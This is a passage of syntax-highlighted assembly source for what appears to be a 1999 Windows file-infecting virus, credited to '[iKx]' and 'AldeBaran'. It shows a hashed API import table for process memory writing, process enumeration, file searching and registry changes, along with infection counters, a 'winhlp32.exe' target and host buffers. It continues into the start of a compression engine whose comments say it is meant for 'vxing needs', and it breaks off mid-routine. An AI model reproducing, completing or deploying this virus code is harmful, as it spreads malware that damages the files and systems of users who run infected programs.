 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0fch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0feh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">  

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">etms.asm</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">dsce.asm</span><span class="sc0">

</span><span class="sc5">getapis</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'KERNEL32.'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'USER32.'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'ADVAPI32.'</span><span class="sc0">                                  </span><span class="sc1">; Pseudo imported dlls</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0aacce3ch</span><span class="sc0">                                    </span><span class="sc1">; file action</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">01558146h</span><span class="sc0">                                    </span><span class="sc1">; see above</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0aacf03dh</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0aad8d85h</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0155be2ch</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0aac3c03h</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">09554ef69h</span><span class="sc0">

</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0D45D57C9h</span><span class="sc0">                                   </span><span class="sc1">; mapping apis</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">05FBCD23Ch</span><span class="sc0">

</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0a412f949h</span><span class="sc0">                                   </span><span class="sc1">; windows libaries managing</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">078a25f37h</span><span class="sc0">                                  

</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0ab16d5ceh</span><span class="sc0">                                   </span><span class="sc1">; memory apis</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0b562d377h</span><span class="sc0">

</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0c6387a85h</span><span class="sc0">                                   </span><span class="sc1">; create exit Threads</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">01cdc7e3fh</span><span class="sc0">

</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0cb8d7a80h</span><span class="sc0">                                   </span><span class="sc1">; priority class setting</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">046863856h</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">04690b856h</span><span class="sc0">

</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0297c5269h</span><span class="sc0">                                   </span><span class="sc1">; suspend create threads</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0a1187bb2h</span><span class="sc0">

</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">002c7218h</span><span class="sc0">                                    </span><span class="sc1">; sleep -)</span><span class="sc0">

</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0b04301d5h</span><span class="sc0">                                   </span><span class="sc1">; Read Write Process Memory</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0a58ad555h</span><span class="sc0">

</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0c26c5705h</span><span class="sc0">                                   </span><span class="sc1">; ToolHelp debugging functions</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">095b0c289h</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0b2b60b08h</span><span class="sc0">

</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">056B3973Eh</span><span class="sc0">                                   </span><span class="sc1">; FindNext/FindFirst/Findclose</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0e37e8dc3h</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">07aaef03fh</span><span class="sc0">

</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0a24e569eh</span><span class="sc0">                                   </span><span class="sc1">; GetCurrent/GetWin/GetSys</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">06259ad0dh</span><span class="sc0">                                   </span><span class="sc1">; directory</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">09a75bb1ah</span><span class="sc0">

</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">05ecf0a4ch</span><span class="sc0">                                   </span><span class="sc1">; MessageBox</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">014d14ccbh</span><span class="sc0">                                   </span><span class="sc1">; getdrivetype</span><span class="sc0">

</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">029bf2c25h</span><span class="sc0">                                   </span><span class="sc1">; OpenProcess</span><span class="sc0">

</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0c53b1c30h</span><span class="sc0">                                   </span><span class="sc1">; RegOpen</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">09774ef48h</span><span class="sc0">                                   </span><span class="sc1">; RegSetKey</span><span class="sc0">

</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0ee84c668h</span><span class="sc0">                                   </span><span class="sc1">; GetSystemTime</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'B0/S0 - [iKx] (c) 1999 all right reserved - present '</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'AldeBaran'</span><span class="sc0">

</span><span class="sc5">pseudofin</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">returnapis</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">Lcreat</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Lopen</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Lclose</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Lwrite</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Lread</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Llseek</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetFileSize</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">MapViewOfFile</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CreateFileMappingA</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">LoadLibraryA</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FreeLibrary</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">   

</span><span class="sc5">VirtualAlloc</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">VirtualFree</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">CreateThread</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ExitThread</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">GetCurrentProcess</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetPriorityClass</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SetPriorityClass</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">SuspendThread</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ResumeThread</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Sleep0</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">ReadProcessMemory</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">WriteProcessMemory</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">CreateToolhelp32Snapshot</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Process32First</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Process32Next</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FindFirstFileA</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FindNextFileA</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FindClose</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">GetCurrentDirectoryA</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetWindowsDirectoryA</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetSystemDirectoryA</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">GetDriveTypeA</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">OpenProcess</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">RegOpenKeyExA</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RegSetValueExA</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">GetSystemTime</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; Temporary datas, arrrrrrrrrrf :)</span><span class="sc0">

</span><span class="sc5">ForeignThread</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">oldseh</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">ReturnTemp</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FileHandle</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">databuffer</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">compressbuffer</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">MapHandle</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MapHandle1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Ourmemory</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">reserror</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Checkres</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">processid</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PseudoData</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">maxinf</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">maxinfect</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">infcount</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">countinfect</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">numbscan</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">waitscan</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">checkflag</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">datadummy</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">400h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">FindData</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">filedata</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">File_Data</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2ch</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'winhlp32.exe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">13</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">ReadyForHost</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0F8h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">TableHost</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">4096</span><span class="sc4">/</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">currbuff2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">400</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">rezo21</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">currbuff3</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2000</span><span class="sc0">    </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">originaldir</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1024</span><span class="sc0">    </span><span class="sc9">dup</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">workingdir</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1024</span><span class="sc0">    </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">pointerdata</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">fin</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">Host</span><span class="sc0">
                                                                       

</span><span class="sc4">---</span><span class="sc0"> </span><span class="sc9">Include</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">DSCE.ASM</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Comperssion engine based on the Huffman algorithm - EvilRats produKtion!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Still under devlopment and test, Version 0.99 revision 5b</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Can support a dword as dictionary base like professional softwares</span><span class="sc0">
</span><span class="sc1">;   Speed up and many improvents to gain time , these routines are 100%</span><span class="sc0">
</span><span class="sc1">;       multitask. These routines doesn't require extra memory to work</span><span class="sc0">
</span><span class="sc1">;       but just need a buffer to acquire datas, for compression, if you are</span><span class="sc0">
</span><span class="sc1">;       not sure, better is to add 8ko to it, it will return the exact size</span><span class="sc0">
</span><span class="sc1">;       of the compressed datas... (You must respect a minimum of 8 Ko buffer,</span><span class="sc0">
</span><span class="sc1">;       else, it will GP Fault)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Ideal utilisation:  Compressing text video datas got 60% and 80</span><span class="sc0">
</span><span class="sc1">;               Compressing executable file got 80-90%</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Revision 5b is specially optimized for very large compression, I mean</span><span class="sc0">
</span><span class="sc1">;   for compressing more than 20 Ko, and not for small buffer, older </span><span class="sc0">
</span><span class="sc1">;   revisions were quite efficient for small buffer (even on 512 bytes</span><span class="sc0">
</span><span class="sc1">;   buffer) but I don't release this version, I don't have commented it.</span><span class="sc0">
</span><span class="sc1">;       If you really want it, please mail: starzeros@hotmail.com</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Ideal code placing: The code was originally coded for 32 bits,</span><span class="sc0">
</span><span class="sc1">;   utilization in 16 bit programs will slow down the compression</span><span class="sc0">
</span><span class="sc1">;   to +- 5 ko/sec... (value taken with Softice but it's so often </span><span class="sc0">
</span><span class="sc1">;       instable..., anyway, the compression is eye visible in dos mode :[ )</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   With revision 5.b, you should compress only larger than 16 Ko to get</span><span class="sc0">
</span><span class="sc1">;   something serious. Else the dictionary (that will take 1Ko entirely)</span><span class="sc0">
</span><span class="sc1">;   will eat to much place. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Unfortunately, this version of DSCE loose about 5 to 10% of compression</span><span class="sc0">
</span><span class="sc1">;   rate, but anyway, it's quite enough for vxing needs...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Test on standard memory compression:</span><span class="sc0">
</span><span class="sc1">;           453 Ko/sec with highest process priorities !!!</span><span class="sc0">
</span><span class="sc1">;           200 Ko/sec with normal process priorities</span><span class="sc0">
</span><span class="sc1">;           48 Ko/sec with lowest process priorities </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Arguments:          DarkCMP             ecx = number of bytes</span><span class="sc0">
</span><span class="sc1">;                       esi = long pointer to addresses</span><span class="sc0">
</span><span class="sc1">;                       edi = long pointer to buffer</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;               UnDkCMP     ecx = size of datas</span><span class="sc0">
</span><span class="sc1">;                       esi = long pointer to the base</span><span class="sc0">
</span><span class="sc1">;                       edi = long pointer to the base                  </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       to get needed memory size, just get the dword at [esi+1],</span><span class="sc0">
</span><span class="sc1">;       then drop over it.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Routine size:   +- 125  for decompression (LZH decoding :)</span><span class="sc0">
</span><span class="sc1">;                          570  for compression </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Revision 5 - Decompression routines reoptimized</span><span class="sc0">
</span><span class="sc1">;           - no more need of extra memory</span><span class="sc0">
</span><span class="sc1">;           - speed up because no three building on output</span><span class="sc0">
</span><span class="sc1">;           - not anymore eye visible</span><span class="sc0">
</span><span class="sc1">;           - we are loosing some percentages compression :(</span><span class="sc0">
</span><span class="sc1">;               - decompression routine size down to: about 125 bytes</span><span class="sc0">
</span><span class="sc1">;           - improvent for decompression speed, down to</span><span class="sc0">
</span><span class="sc1">;           84 microsecond for 50 Ko on a P133 !!!</span><span class="sc0">
</span><span class="sc1">;           (I didn't belived myself but true, 5000 Mega/sec ???)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Revision 4 - Improved construction, Complete 32 bit structures</span><span class="sc0">
</span><span class="sc1">;       - Revised time critical procedure 1 (256 times speed up!)</span><span class="sc0">
</span><span class="sc1">;       - Revised time critical procedure 3 (for very large compression)</span><span class="sc0">
</span><span class="sc1">;       - A few bugs revised</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; - I have to greet zombie for all his help during the writing of</span><span class="sc0">
</span><span class="sc1">;                                                            these routines -</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">DarkCMP</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                                     </span><span class="sc1">; saving value for compressed</span><span class="sc0">
                                                </span><span class="sc1">; size calculation </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'h'</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">           </span><span class="sc1">; original size</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                                     </span><span class="sc1">; saving value for later</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">*</span><span class="sc2">256</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">; set where we will put datas</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">;+4 don't worry this is</span><span class="sc0">
                        </span><span class="sc1">;for stimulated stack</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;just for coder's comprehension</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;+8</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">; making a 1024 bytes zero</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1024</span><span class="sc0">                                </span><span class="sc1">; zone</span><span class="sc0">
</span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;-8</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">dictionarylookup</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; Time Critical Revision One</span><span class="sc0">

